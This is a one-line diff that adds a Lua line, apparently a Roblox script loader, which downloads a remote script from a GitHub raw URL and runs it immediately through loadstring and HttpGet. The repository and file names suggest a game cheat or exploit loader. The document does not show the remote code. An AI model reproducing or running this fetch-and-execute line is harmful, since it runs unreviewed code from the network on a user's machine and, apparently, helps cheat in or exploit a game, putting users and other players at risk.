@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/flame-eye-crazy-skeleton-rng-spam2-myrex9rpoaozgy.lua"))()
